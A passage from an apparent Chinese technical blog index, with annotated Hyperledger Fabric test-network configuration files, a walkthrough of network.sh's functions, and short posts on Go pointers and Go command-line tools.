- localhost crypto-config-org1.yaml # --------------------------------------------------------------------------- # \u0026#34;PeerOrgs\u0026#34; - Definition of organizations managing peer nodes # --------------------------------------------------------------------------- PeerOrgs:\t# 这里定义的由peer节点组成的组织1的信息 # --------------------------------------------------------------------------- # Org1 # --------------------------------------------------------------------------- - Name: Org1\t# 组织名称 Domain: org1.example.com\t# 组织域名 EnableNodeOUs: true\t# 生成msp文件 # --------------------------------------------------------------------------- # \u0026#34;Specs\u0026#34; # --------------------------------------------------------------------------- # Uncomment this section to enable the explicit definition of hosts in your # configuration. Most users will want to use Template, below # # Specs is an array of Spec entries. Each Spec entry consists of two fields: # - Hostname: (Required) The desired hostname, sans the domain. # - CommonName: (Optional) Specifies the template or explicit override for # the CN. By default, this is the template: # # \u0026#34;{{.Hostname}}.{{.Domain}}\u0026#34; # # which obtains its values from the Spec.Hostname and # Org.Domain, respectively. # --------------------------------------------------------------------------- # - Hostname: foo # implicitly \u0026#34;foo.org1.example.com\u0026#34; # CommonName: foo27.org5.example.com # overrides Hostname-based FQDN set above # - Hostname: bar # - Hostname: baz # --------------------------------------------------------------------------- # \u0026#34;Template\u0026#34; # --------------------------------------------------------------------------- # Allows for the definition of 1 or more hosts that are created sequentially # from a template. By default, this looks like \u0026#34;peer%d\u0026#34; from 0 to Count-1. # You may override the number of nodes (Count), the starting index (Start) # or the template used to construct the name (Hostname). # # Note: Template and Specs are not mutually exclusive. You may define both # sections and the aggregate nodes will be created for you. Take care with # name collisions # --------------------------------------------------------------------------- Template: Count: 1\t# 节点个数 SANS: - localhost # Start: 5 # Hostname: {{.Prefix}}{{.Index}} # default # --------------------------------------------------------------------------- # \u0026#34;Users\u0026#34; # --------------------------------------------------------------------------- # Count: The number of user accounts _in addition_ to Admin # --------------------------------------------------------------------------- Users: Count: 1\t# 管理员个数 crypto-config-org2.yaml # --------------------------------------------------------------------------- # \u0026#34;PeerOrgs\u0026#34; - Definition of organizations managing peer nodes # --------------------------------------------------------------------------- PeerOrgs: # --------------------------------------------------------------------------- # Org2 # --------------------------------------------------------------------------- - Name: Org2 Domain: org2.example.com EnableNodeOUs: true # --------------------------------------------------------------------------- Template: Count: 1 SANS: - localhost # --------------------------------------------------------------------------- Users: Count: 1 如果我们要配置三个组织：含有三个orderer节点的Orderer组织，两个包含两个peer节点的Org组织，那么配置文件应该这样写：\n# Orderer组织配置如下 OrdererOrgs: - Name: Orderer Domain: example.com EnableNodeOUs: true Specs: - Hostname: orderer0 - Hostname: orderer1 - Hostname: orderer2 # Org1组织配置如下 PeerOrgs: - Name: Org1 Domain: org1.example.com EnableNodeOUs: true Template: Count: 2 Users: Count: 1 # Org2配置如下 PeerOrgs: - Name: Org2 Domain: org2.example.com EnableNodeOUs: true Template: Count: 2 Users: Count: 1 关于使用cryptogen还是CAs去生成加密证书材料，Fabric是这样说的：\n启动网络之前，每个组织需要生成加密材料，来定义网络中的组织。由于Fabric是许可链，网络中的每一个节点和用户需要使用证书以及密钥进行签名、验证等行为。此外，每个用户需要从属于某个组织，这个组织被视为网络的成员。你可以使用Cryptogen tool和Fabric CAs去生成组织的加密材料。\n默认情况，测试网络使用cryptogen工具。这个工具在开发和测试环境中可以快速的生成证书材料和密钥，这些几乎在网络中处处都会用到。\n同样的，也可以使用Fabric CAs生成证书、密钥等加密材料。CAs对证书进行签名并发放密钥，为每个组织生成一个合法的根信任。通过配置文件，使用registerEnroll.sh脚本生成实体、证书、MSP相关的文件。\n第二步 使用configtxgen生成创世区块 configtxgen工具使用configtx.yaml文件生成创世区块，这个文件也用来定义网络。通过这个文件，我们可以定义联盟，也就是把组织是为联盟的成员。其中，需要用到每个成员的MSP证书（上一步已经生成），来创建通道MSP，作为每个组织的根信任。通道MSP使得组织可以被视为网络成员。configtx.yaml文件同样定义了每个peer组织的锚节点，之后还用于创建通道及更新锚节点。\nroot@lizonglin-virtual-machine:/home/lizonglin/GoWork/src/github.com/fabric/scripts/fabric-samples/test-network/configtx# cat configtx.yaml # Copyright IBM Corp. All Rights Reserved. # # SPDX-License-Identifier: Apache-2.0 # --- ################################################################################ # # Section: Organizations # # - This section defines the different organizational identities which will # be referenced later in the configuration. # ################################################################################ Organizations: # 这个组织包含如下内容 # SampleOrg defines an MSP using the sampleconfig. It should never be used # in production but may be used as a template for other definitions - \u0026amp;OrdererOrg\t# 可以在yaml文件的其他地方引用这个名字 # DefaultOrg defines the organization which is used in the sampleconfig # of the fabric.git development environment Name: OrdererOrg\t# 名字 # ID to load the MSP definition as ID: OrdererMSP\t# MSPid # MSPDir is the filesystem path which contains the MSP configuration MSPDir: ../organizations/ordererOrganizations/example.com/msp\t# 寻找msp的路径 # Policies defines the set of policies at this level of the config tree # For organization policies, their canonical path is usually # /Channel/\u0026lt;Application|Orderer\u0026gt;/\u0026lt;OrgName\u0026gt;/\u0026lt;PolicyName\u0026gt; Policies:\t# 该组织的策略 Readers:\t# 读策略 Type: Signature Rule: \u0026#34;OR(\u0026#39;OrdererMSP.member\u0026#39;)\u0026#34;\t# 由该OrdererMSP的任何一个成员签名就可以读 Writers:\t# 写策略 Type: Signature Rule: \u0026#34;OR(\u0026#39;OrdererMSP.member\u0026#39;)\u0026#34; # 同样的 OR 指 有一个就行 Admins:\t# 管理员 Type: Signature Rule: \u0026#34;OR(\u0026#39;OrdererMSP.admin\u0026#39;)\u0026#34; OrdererEndpoints:\t# 该组织端口号 - orderer.example.com:7050 - \u0026amp;Org1 # 组织1，在yaml文件中 \u0026amp;xxx 的写法使其可以在别处被引用 # DefaultOrg defines the organization which is used in the sampleconfig # of the fabric.git development environment Name: Org1MSP # ID to load the MSP definition as ID: Org1MSP MSPDir: ../organizations/peerOrganizations/org1.example.com/msp # Policies defines the set of policies at this level of the config tree # For organization policies, their canonical path is usually # /Channel/\u0026lt;Application|Orderer\u0026gt;/\u0026lt;OrgName\u0026gt;/\u0026lt;PolicyName\u0026gt; Policies: Readers: Type: Signature # 这里的策略是，有\u0026#39;Org1MSP.admin\u0026#39;, \u0026#39;Org1MSP.peer\u0026#39;, \u0026#39;Org1MSP.client\u0026#39;三者中的一个允许就可以读 Rule: \u0026#34;OR(\u0026#39;Org1MSP.admin\u0026#39;, \u0026#39;Org1MSP.peer\u0026#39;, \u0026#39;Org1MSP.client\u0026#39;)\u0026#34; Writers: # 同理有两个中的一个就可写 Type: Signature Rule: \u0026#34;OR(\u0026#39;Org1MSP.admin\u0026#39;, \u0026#39;Org1MSP.client\u0026#39;)\u0026#34; Admins:\t# 只有admin Type: Signature Rule: \u0026#34;OR(\u0026#39;Org1MSP.admin\u0026#39;)\u0026#34; Endorsement:\t# 有一个Org1MSP的peer节点签名就可以背书 Type: Signature Rule: \u0026#34;OR(\u0026#39;Org1MSP.peer\u0026#39;)\u0026#34; # leave this flag set to true. AnchorPeers:\t# 锚节点用于跨组织通信 # AnchorPeers defines the location of peers which can be used # for cross org gossip communication. Note, this value is only # encoded in the genesis block in the Application section context - Host: peer0.org1.example.com Port: 7051 - \u0026amp;Org2 # DefaultOrg defines the organization which is used in the sampleconfig # of the fabric.git development environment Name: Org2MSP # ID to load the MSP definition as ID: Org2MSP MSPDir: ../organizations/peerOrganizations/org2.example.com/msp # Policies defines the set of policies at this level of the config tree # For organization policies, their canonical path is usually # /Channel/\u0026lt;Application|Orderer\u0026gt;/\u0026lt;OrgName\u0026gt;/\u0026lt;PolicyName\u0026gt; Policies: Readers: Type: Signature Rule: \u0026#34;OR(\u0026#39;Org2MSP.admin\u0026#39;, \u0026#39;Org2MSP.peer\u0026#39;, \u0026#39;Org2MSP.client\u0026#39;)\u0026#34; Writers: Type: Signature Rule: \u0026#34;OR(\u0026#39;Org2MSP.admin\u0026#39;, \u0026#39;Org2MSP.client\u0026#39;)\u0026#34; Admins: Type: Signature Rule: \u0026#34;OR(\u0026#39;Org2MSP.admin\u0026#39;)\u0026#34; Endorsement: Type: Signature Rule: \u0026#34;OR(\u0026#39;Org2MSP.peer\u0026#39;)\u0026#34; AnchorPeers: # AnchorPeers defines the location of peers which can be used # for cross org gossip communication. Note, this value is only # encoded in the genesis block in the Application section context - Host: peer0.org2.example.com Port: 9051 ################################################################################ # # SECTION: Capabilities # # - This section defines the capabilities of fabric network. This is a new # concept as of v1.1.0 and should not be utilized in mixed networks with # v1.0.x peers and orderers. Capabilities define features which must be # present in a fabric binary for that binary to safely participate in the # fabric network. For instance, if a new MSP type is added, newer binaries # might recognize and validate the signatures from this type, while older # binaries without this support would be unable to validate those # transactions. This could lead to different versions of the fabric binaries # having different world states. Instead, defining a capability for a channel # informs those binaries without this capability that they must cease # processing transactions until they have been upgraded. For v1.0.x if any # capabilities are defined (including a map with all capabilities turned off) # then the v1.0.x peer will deliberately crash. # ################################################################################ Capabilities: # Channel capabilities apply to both the orderers and the peers and must be # supported by both. # Set the value of the capability to true to require it. Channel: \u0026amp;ChannelCapabilities # V2_0 capability ensures that orderers and peers behave according # to v2.0 channel capabilities. Orderers and peers from # prior releases would behave in an incompatible way, and are therefore # not able to participate in channels at v2.0 capability. # Prior to enabling V2.0 channel capabilities, ensure that all # orderers and peers on a channel are at v2.0.0 or later. V2_0: true # Orderer capabilities apply only to the orderers, and may be safely # used with prior release peers. # Set the value of the capability to true to require it. Orderer: \u0026amp;OrdererCapabilities # V2_0 orderer capability ensures that orderers behave according # to v2.0 orderer capabilities. Orderers from # prior releases would behave in an incompatible way, and are therefore # not able to participate in channels at v2.0 orderer capability. # Prior to enabling V2.0 orderer capabilities, ensure that all # orderers on channel are at v2.0.0 or later. V2_0: true # Application capabilities apply only to the peer network, and may be safely # used with prior release orderers. # Set the value of the capability to true to require it. Application: \u0026amp;ApplicationCapabilities # V2_0 application capability ensures that peers behave according # to v2.0 application capabilities. Peers from # prior releases would behave in an incompatible way, and are therefore # not able to participate in channels at v2.0 application capability. # Prior to enabling V2.0 application capabilities, ensure that all # peers on channel are at v2.0.0 or later. V2_0: true ################################################################################ # # SECTION: Application # # - This section defines the values to encode into a config transaction or # genesis block for application related parameters # ################################################################################ Application: \u0026amp;ApplicationDefaults # Organizations is the list of orgs which are defined as participants on # the application side of the network Organizations: # Policies defines the set of policies at this level of the config tree # For Application policies, their canonical path is # /Channel/Application/\u0026lt;PolicyName\u0026gt; Policies: Readers: Type: ImplicitMeta Rule: \u0026#34;ANY Readers\u0026#34; Writers: Type: ImplicitMeta Rule: \u0026#34;ANY Writers\u0026#34; Admins: Type: ImplicitMeta Rule: \u0026#34;MAJORITY Admins\u0026#34; LifecycleEndorsement: Type: ImplicitMeta Rule: \u0026#34;MAJORITY Endorsement\u0026#34; Endorsement: Type: ImplicitMeta Rule: \u0026#34;MAJORITY Endorsement\u0026#34; Capabilities: \u0026lt;\u0026lt;: *ApplicationCapabilities ################################################################################ # # SECTION: Orderer # # - This section defines the values to encode into a config transaction or # genesis block for orderer related parameters # ################################################################################ Orderer: \u0026amp;OrdererDefaults # Orderer Type: The orderer implementation to start OrdererType: etcdraft EtcdRaft: Consenters: - Host: orderer.example.com Port: 7050 ClientTLSCert: ../organizations/ordererOrganizations/example.com/orderers/orderer.example.com/tls/server.crt ServerTLSCert: ../organizations/ordererOrganizations/example.com/orderers/orderer.example.com/tls/server.crt # Batch Timeout: The amount of time to wait before creating a batch BatchTimeout: 2s # Batch Size: Controls the number of messages batched into a block BatchSize: # Max Message Count: The maximum number of messages to permit in a batch MaxMessageCount: 10 # Absolute Max Bytes: The absolute maximum number of bytes allowed for # the serialized messages in a batch. AbsoluteMaxBytes: 99 MB # Preferred Max Bytes: The preferred maximum number of bytes allowed for # the serialized messages in a batch. A message larger than the preferred # max bytes will result in a batch larger than preferred max bytes. PreferredMaxBytes: 512 KB # Organizations is the list of orgs which are defined as participants on # the orderer side of the network Organizations: # Policies defines the set of policies at this level of the config tree # For Orderer policies, their canonical path is # /Channel/Orderer/\u0026lt;PolicyName\u0026gt; Policies: Readers: Type: ImplicitMeta Rule: \u0026#34;ANY Readers\u0026#34; Writers: Type: ImplicitMeta Rule: \u0026#34;ANY Writers\u0026#34; Admins: Type: ImplicitMeta Rule: \u0026#34;MAJORITY Admins\u0026#34; # BlockValidation specifies what signatures must be included in the block # from the orderer for the peer to validate it. BlockValidation: Type: ImplicitMeta Rule: \u0026#34;ANY Writers\u0026#34; ################################################################################ # # CHANNEL # # This section defines the values to encode into a config transaction or # genesis block for channel related parameters. # ################################################################################ Channel: \u0026amp;ChannelDefaults # Policies defines the set of policies at this level of the config tree # For Channel policies, their canonical path is # /Channel/\u0026lt;PolicyName\u0026gt; Policies: # Who may invoke the \u0026#39;Deliver\u0026#39; API Readers: Type: ImplicitMeta Rule: \u0026#34;ANY Readers\u0026#34; # Who may invoke the \u0026#39;Broadcast\u0026#39; API Writers: Type: ImplicitMeta Rule: \u0026#34;ANY Writers\u0026#34; # By default, who may modify elements at this config level Admins: Type: ImplicitMeta Rule: \u0026#34;MAJORITY Admins\u0026#34; # Capabilities describes the channel level capabilities, see the # dedicated Capabilities section elsewhere in this file for a full # description Capabilities: \u0026lt;\u0026lt;: *ChannelCapabilities ################################################################################ # # Profile # # - Different configuration profiles may be encoded here to be specified # as parameters to the configtxgen tool # ################################################################################ Profiles: TwoOrgsOrdererGenesis: \u0026lt;\u0026lt;: *ChannelDefaults Orderer: \u0026lt;\u0026lt;: *OrdererDefaults Organizations: - *OrdererOrg Capabilities: \u0026lt;\u0026lt;: *OrdererCapabilities Consortiums: SampleConsortium: Organizations: - *Org1 - *Org2 TwoOrgsChannel: Consortium: SampleConsortium \u0026lt;\u0026lt;: *ChannelDefaults Application: \u0026lt;\u0026lt;: *ApplicationDefaults Organizations: - *Org1 - *Org2 Capabilities: \u0026lt;\u0026lt;: *ApplicationCapabilities ","date":"2021-02-10T22:38:18+08:00","permalink":"https://lizonglingo.github.io/p/fabric2.x%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%A5test-network%E4%B8%BA%E4%BE%8B/","title":"Fabric2.X的配置文件（以test-network为例）"},{"content":" 很多主流语言中都有指针作为变量的一种，go也不例外。一方面，go保留了例如c、cpp等语言的严谨性，同时兼有python、函数式编程语言的灵活性；针对长历史的语言，去其糟粕取其精华，依然保留了指针。\n值传递和引用传递 相信在初学c语言时，指针对于大部分人来说有些难以理解，尤其是不了解计算机底层的人，传值、传地址难以区分。c和cpp中，指针操作有传值和**传引用（地址）**两种方式。\n传值 传值就是传递变量的值，相当于把这个变量复制一份，用于函数域中的操作。函数域之外，变量的值不受影响。\n传引用 传引用，也叫传地址，在某个函数中操作以引用方式传进去的变量，会改变变量实际的值，也就是在函数域之外，变量的值也会被改变。\nvoid con_value(int num){ num++; } void con_refer(int \u0026amp;a){ num++; } int main(){ int num = 1; con_value(num); printf(\u0026#34;n1 = %d\\n\u0026#34;, num); con_refer(num); printf(\u0026#34;n2 = %d\\n\u0026#34;, num); } con_value()就是值传递，con_refer()就是传引用。执行main()函数后，n1 = 1因为传入的只是值，相当于con_value()把num复制了一份用来操作，实际上函数的作用域之外num没有变；n2 = 2，con_refer()则是传入的引用，直接使用了num，所以无论函数内还是外，num的值都发生的改变。\ngo中的指针 在go语言中，指针只有值传递这一种，也就是函数做的只是拷贝，然后再使用。\n情况一：函数内改变不影响函数外 var a int fun f(a int){ ... } 这种情况下，f()中对a的改变不会影响的外面的a，因为是拷贝过去的。\n情况二：通过指针改变变量实际的值（通过传递指针达到引用传递的效果） var na int = 2 var pa *int = \u0026amp;na func f(pa *int) { *pa++ fmt.Println(*pa) } 首先，na是int型变量，而pa是指向na地址的指针，我们通过传入一个指针来改变变量的值。同样以值传递的思想，函数f()拷贝了一份pa，但是无论怎么拷贝，拷贝出的东西它都是指向na的地址的，所以通过传一个指针就可以改变对应地址的值，函数外na的值也发生了改变。\n情况三： 关于object的传递 var object Object func f(object Object){ ··· } 如果是这种情况，就要看在定义object时，是把他当作值传递来用还是引用传递来用。\n// 1.这种情况可以安全的当作值传递来用 type Object struct { a *int } func f(object Object){ ... } func main(){ l := 9 o := Object{\u0026amp;l} // 不管怎么拷贝，拷贝出的 object.a 都是指向原本l的地址，会改变l的值 f(o)\t} // 2.如果对象需要例如维护某些状态，仅仅传值是不会改变函数外参数原本的值的，如：st type Object struct { a *int st bool // 一个bool值 } func fo(object Object) { // 传值，一个Object类型的值 *object.a ++ object.st = false // 原本的st不会被改变 } func main() { l := 9 o := Object{\u0026amp;l, true} fo(o) fmt.Printf(\u0026#34;%d \u0026#34;, *o.a) // 10 fmt.Println(o.st)\t// true } // 3.如果需要，传指针来实现引用传递的效果，如下面的 st 被修改了 func p_fo(object *Object) {\t// 接收一个Object类型的指针 *object.a++ object.st = false\t// 拷贝后的 object 指向原来的地址，赋值操作实际上改变原值 } func main() { l := 9 o := Object{\u0026amp;l, true} o_p := \u0026amp;o p_fo(o_p) fmt.Printf(\u0026#34;%d \u0026#34;, *o.a) // 10 fmt.Println(o.st) // false } 所以，在定义一个Object时，要考虑以后是用值还是用引用，再来定义使其更方便的被使用。\n","date":"2021-02-07T21:53:10+08:00","permalink":"https://lizonglingo.github.io/p/golang%E7%9A%84%E6%8C%87%E9%92%88/","title":"Golang的指针"},{"content":" Fabric2.X中，用fabric-samples替换掉原来的first-network，提供给开发人员快速上手。fabric-samples中的test-network为我们提供了一系列脚本和配置文件，让我们可以简单的启动一个fabric网络。\n本文以广度优先的方法解读network.sh的内容\nnetwork.sh a.设置环境变量 export PATH=${PWD}/../bin:${PWD}:$PATH export FABRIC_CFG_PATH=${PWD}/configtx export VERBOSE=false bin目录内容如下 ├─bin\r│ configtxgen\r│ configtxlator\r│ cryptogen\r│ discover\r│ fabric-ca-client\r│ fabric-ca-server\r│ idemixgen\r│ orderer\r│ peer cryptogen以及configtxgen这两个重要的工具通过编译生成，用来创建参与网络实体的证书，生成创世区块和通道的配置文件以及组织的锚节点。相应的，bin目录中还有其他需要使用到的工具。\nconfigtx中的文件是用来配置网络的，configtxgen这个工具就是依靠configtx中的configtx.yaml文件来定义网络。\nb.提供函数 clearContainers() 清除启动、运行网络时，在docker中创建的镜像；这个函数在关闭网络时被调用。\nremoveUnwantedImages() 清除不想要的镜像\ncheckPrereqs() 检查网络组件、二进制文件、镜像文件的版本，依托于上级目录的config文件夹，该文件夹的内容中包含了Fabric网络中的基本属性的配置，其内容如下：\n├─config │ configtx.yaml │ core.yaml\t│ orderer.yaml 检查peer版本、docker_image版本。\n一般来说，拉取Fabric项目后，使用bootstrap.sh脚本，都可以得到对应版本的文件以及环境。\ncreateOrgs() 该函数使用cryptogen工具或者CAs创建组织的身份材料，它在运行时首先清理掉现有的身份，然后一步步执行。在test-network中，首先使用cryptogen或者CAs工具创建Org1，Org2的身份，然后创建Orderer Org的身份。\n一旦创建了组织的身份后，我们就需要生成genesis block，并且创建应用的channel让Orderer节点加入。\ncreateConsortium() 该函数使用configtxgen这个工具生成channel的orderer genesis block。\n在创建组织实体身份以及创世区块后，就可以开启peers和orderering服务了。\nnetworkUp() 该函数使用docker compose开启peer和orderer节点。成功后，为我们打印出当前的docker images。\n对于运行的Fabric网络，可以创建channel实现应用数据的隔离。\ncreateChannel() 该函数创建一个channel让Org1和Org2的peers节点加入。首先，它检查网络是否启动，如果没有，就先把网络开启，然后再创建。它使用createChannel.sh脚本创建通道。\ndeployCC() 该函数把链码安装到通道上并将链码实例化，它调用deployCC.sh这个脚本实现。\nnetworkDown() 该函数断开正在运行的网络，它首先删除docker compose中的镜像，清除容器，删除genesis block各个组织的ca，卸载chaincode。也就是说，down掉网络后，我们在上面创建的实体、通道，安装的链码等等全部被清除掉了，如果再次启动时还需从头开始配置。\nUp \u0026amp; Down ./network.sh up 这个命令其实就是调用函数networkUp()，函数中依次调用：\ncreateOrgs() createConsortium() 开启docker-compose 打印docker ps -a存在的镜像 ./network.sh down 这个命令调用函数networkDown()，函数中依次调用：\ndocker-compose -f删除镜像 clearContainers() removeUnwantedImages rm -rf system-genesis-block rm -rf organizations/fabric-ca/org... rm -rf channel-artifacts log.txt chaincode.tar.gz chaincode ","date":"2021-01-24T22:32:13+08:00","permalink":"https://lizonglingo.github.io/p/network.sh-up-enter%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/","title":"$ ./network.sh up =\u003eENTER后发生了什么？"},{"content":"一般格式：go command [arguments]\nbuild build\n最常用的命令，用来编译go文件\n跨平台编译，如env GOOS=linux GOARCH=amd64 go build在Linux系统、amd64架构编译\ninstall install\n同为编译，和build的不同在于编译后会将输出文件打包成库放在pkg下面\nget get\n用于获取go第三方包，默认从git repo获取最新版本，如go get -u github.com/go-sql-driver/mysql\nfmt fmt\n统一代码风格，go fmt\ntest test\n运行当前包目录下的test，如go test或go test -v，test文件命名是xxx_test.go\n关于写test case：\ntest命名为TestXxxx\ntest case 的参数为：t *testing.T 或者 b *testing.B (用于测试性能)\nt.Errorf() 用于打印错误信息，同时跳过整个test case\nt.SkipNow() 为跳过当前test，并且直接处理下一个test case，要写在test case的第一行\nt.Run() 来执行subtests，可以做到控制test输出以及test的顺序\nTestMain(m *testing.M) 初始化test，使用m.Run()来调用其他tests，可以用来完成一些初始化；如果没有调用m.Run()，那么处了TestMain以外其他的tests就不会被执行\n关于benchmark：\nbenchmark函数一般以Benchmark开头，如BenchmarkXxx 参数为： b *testing.B 每次执行一般会跑b.N次 在执行过程中根据实际case的执行时间是否稳定来调整b.N的次数直至稳定 命令行中，命令为：go test -bench=. ","date":"2021-01-23T19:35:32+08:00","permalink":"https://lizonglingo.github.io/p/golang%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/","title":"Golang常用工具"},{"content":" Fabric2.X中，fabric-samples将作为Fabric1.X中的first-network的替代。也就是说，在2.X版本及以后，使用fabric-samples作为fabric的测试网络了。\n在配置好基本环境之后，来看一下它为我们提供了哪些内容。\n目录结构 root@lizonglin-virtual-machine:/home/lizonglin/GoWork/src/github.com/fabric/scripts/fabric-samples# ll total 100 drwxr-xr-x 15 lizonglin lizonglin 4096 1月 21 10:55 ./ drwxr-xr-x 3 lizonglin lizonglin 4096 1月 21 10:17 ../ drwxr-xr-x 2 lizonglin lizonglin 4096 10月 1 03:52 bin/ drwxr-xr-x 8 lizonglin lizonglin 4096 1月 21 10:55 chaincode/ drwxr-xr-x 3 lizonglin lizonglin 4096 1月 21 10:55 chaincode-docker-devmode/ drwxr-xr-x 4 lizonglin lizonglin 4096 1月 21 10:55 ci/ -rw-r--r-- 1 lizonglin lizonglin 597 1月 17 18:50 CODE_OF_CONDUCT.md -rw-r--r-- 1 lizonglin lizonglin 109 1月 17 18:50 CODEOWNERS drwxr-xr-x 3 lizonglin lizonglin 4096 1月 21 10:55 commercial-paper/ drwxr-xr-x 2 lizonglin lizonglin 4096 10月 1 02:41 config/ -rw-r--r-- 1 lizonglin lizonglin 935 1月 17 18:50 CONTRIBUTING.md drwxr-xr-x 5 lizonglin lizonglin 4096 1月 21 10:55 fabcar/ drwxr-xr-x 6 lizonglin lizonglin 4096 1月 21 11:24 first-network/ drwxr-xr-x 8 lizonglin lizonglin 4096 1月 21 10:55 .git/ -rw-r--r-- 1 lizonglin lizonglin 189 1月 21 10:55 .gitignore drwxr-xr-x 4 lizonglin lizonglin 4096 1月 21 10:55 high-throughput/ drwxr-xr-x 4 lizonglin lizonglin 4096 1月 21 10:55 interest_rate_swaps/ -rw-r--r-- 1 lizonglin lizonglin 11358 1月 17 18:50 LICENSE -rw-r--r-- 1 lizonglin lizonglin 1644 1月 21 10:55 MAINTAINERS.md drwxr-xr-x 2 lizonglin lizonglin 4096 1月 21 10:55 off_chain_data/ -rw-r--r-- 1 lizonglin lizonglin 1694 1月 21 10:55 README.md -rw-r--r-- 1 lizonglin lizonglin 1035 1月 17 18:50 SECURITY.md drwxr-xr-x 8 lizonglin lizonglin 4096 1月 21 18:52 test-network/ fabric-samples的目录结构如下，可以看到还是暂时为我们保留了first-network，但是新版的启动网络脚本则是在test-network中。\nroot@lizonglin-virtual-machine:/home/lizonglin/GoWork/src/github.com/fabric/scripts/fabric-samples/test-network# ll total 68 drwxr-xr-x 8 lizonglin lizonglin 4096 1月 21 18:52 ./ drwxr-xr-x 15 lizonglin lizonglin 4096 1月 21 10:55 ../ drwxr-xr-x 4 lizonglin lizonglin 4096 1月 21 10:55 addOrg3/ drwxr-xr-x 2 lizonglin lizonglin 4096 1月 21 10:55 configtx/ drwxr-xr-x 2 lizonglin lizonglin 4096 1月 21 10:55 docker/ -rw-r--r-- 1 lizonglin lizonglin 69 1月 17 18:50 .env -rw-r--r-- 1 lizonglin lizonglin 349 1月 21 10:55 .gitignore -rwxr-xr-x 1 lizonglin lizonglin 20570 1月 21 10:55 network.sh* drwxr-xr-x 4 lizonglin lizonglin 4096 1月 21 20:05 organizations/ -rw-r--r-- 1 lizonglin lizonglin 788 1月 21 10:55 README.md drwxr-xr-x 3 lizonglin lizonglin 4096 1月 21 10:55 scripts/ drwxr-xr-x 2 lizonglin lizonglin 4096 1月 21 20:05 system-genesis-block/ network.sh 其中，network.sh*即启动脚本，在新的脚本中，为我们进行了大量的配置工作，使得新版本的脚本很长，省略一些不必要的内容：\n#!/bin/bash # 首先是一些说明： # 两个组织，每个组织一个peer节点 # 一个使用Raft单节点的排序服务 # This script brings up a Hyperledger Fabric network for testing smart contracts # and applications. The test network consists of two organizations with one # peer each, and a single node Raft ordering service. Users can also use this # script to create a channel deploy a chaincode on the channel # # prepending $PWD/../bin to PATH to ensure we are picking up the correct binaries # this may be commented out to resolve installed version of tools if desired export PATH=${PWD}/../bin:${PWD}:$PATH export FABRIC_CFG_PATH=${PWD}/configtx export VERBOSE=false # Print the usage message function printHelp() { echo \u0026#34;Usage: \u0026#34; echo \u0026#34; network.sh \u0026lt;Mode\u0026gt; [Flags]\u0026#34; echo \u0026#34; \u0026lt;Mode\u0026gt;\u0026#34; echo \u0026#34; - \u0026#39;up\u0026#39; - bring up fabric orderer and peer nodes. No channel is created\u0026#34; echo \u0026#34; - \u0026#39;up createChannel\u0026#39; - bring up fabric network with one channel\u0026#34; echo \u0026#34; - \u0026#39;createChannel\u0026#39; - create and join a channel after the network is created\u0026#34; echo \u0026#34; - \u0026#39;deployCC\u0026#39; - deploy the fabcar chaincode on the channel\u0026#34; echo \u0026#34; - \u0026#39;down\u0026#39; - clear the network with docker-compose down\u0026#34; echo \u0026#34; - \u0026#39;restart\u0026#39; - restart the network\u0026#34; echo echo \u0026#34; Flags:\u0026#34; echo \u0026#34; -ca \u0026lt;use CAs\u0026gt; - create Certificate Authorities to generate the crypto material\u0026#34; echo \u0026#34; -c \u0026lt;channel name\u0026gt; - channel name to use (defaults to \\\u0026#34;mychannel\\\u0026#34;)\u0026#34; echo \u0026#34; -s \u0026lt;dbtype\u0026gt; - the database backend to use: goleveldb (default) or couchdb\u0026#34; echo \u0026#34; -r \u0026lt;max retry\u0026gt; - CLI times out after certain number of attempts (defaults to 5)\u0026#34; echo \u0026#34; -d \u0026lt;delay\u0026gt; - delay duration in seconds (defaults to 3)\u0026#34; echo \u0026#34; -l \u0026lt;language\u0026gt; - the programming language of the chaincode to deploy: go (default), java, javascript, typescript\u0026#34; echo \u0026#34; -v \u0026lt;version\u0026gt; - chaincode version. Must be a round number, 1, 2, 3, etc\u0026#34; echo \u0026#34; -i \u0026lt;imagetag\u0026gt; - the tag to be used to launch the network (defaults to \\\u0026#34;latest\\\u0026#34;)\u0026#34; echo \u0026#34; -verbose - verbose mode\u0026#34; echo \u0026#34; network.sh -h (print this message)\u0026#34; echo echo \u0026#34; Possible Mode and flags\u0026#34; echo \u0026#34; network.sh up -ca -c -r -d -s -i -verbose\u0026#34; echo \u0026#34; network.sh up createChannel -ca -c -r -d -s -i -verbose\u0026#34; echo \u0026#34; network.sh createChannel -c -r -d -verbose\u0026#34; echo \u0026#34; network.sh deployCC -l -v -r -d -verbose\u0026#34; echo echo \u0026#34; Taking all defaults:\u0026#34; echo \u0026#34;\tnetwork.sh up\u0026#34; echo echo \u0026#34; Examples:\u0026#34; echo \u0026#34; network.sh up createChannel -ca -c mychannel -s couchdb -i 2.0.0\u0026#34; echo \u0026#34; network.sh createChannel -c channelName\u0026#34; echo \u0026#34; network.sh deployCC -l javascript\u0026#34; } # 清理docker容器 # Obtain CONTAINER_IDS and remove them # TODO Might want to make this optional - could clear other containers # This function is called when you bring a network down function clearContainers() { CONTAINER_IDS=$(docker ps -a | awk \u0026#39;($2 ~ /dev-peer.*/) {print $1}\u0026#39;) if [ -z \u0026#34;$CONTAINER_IDS\u0026#34; -o \u0026#34;$CONTAINER_IDS\u0026#34; == \u0026#34; \u0026#34; ]; then echo \u0026#34;---- No containers available for deletion ----\u0026#34; else docker rm -f $CONTAINER_IDS fi } # 删除docker镜像 # Delete any images that were generated as a part of this setup # specifically the following images are often left behind: # This function is called when you bring the network down function removeUnwantedImages() { DOCKER_IMAGE_IDS=$(docker images | awk \u0026#39;($1 ~ /dev-peer.*/) {print $3}\u0026#39;) if [ -z \u0026#34;$DOCKER_IMAGE_IDS\u0026#34; -o \u0026#34;$DOCKER_IMAGE_IDS\u0026#34; == \u0026#34; \u0026#34; ]; then echo \u0026#34;---- No images available for deletion ----\u0026#34; else docker rmi -f $DOCKER_IMAGE_IDS fi } # Versions of fabric known not to work with the test network BLACKLISTED_VERSIONS=\u0026#34;^1\\.0\\. ^1\\.1\\. ^1\\.2\\. ^1\\.3\\. ^1\\.4\\.\u0026#34; # 这里检查一下现有的二进制文件以及镜像是否可用，免得后续出现问题 # Do some basic sanity checking to make sure that the appropriate versions of fabric # binaries/images are available. In the future, additional checking for the presence # of go or other items could be added. function checkPrereqs() { ## Check if your have cloned the peer binaries and configuration files. peer version \u0026gt; 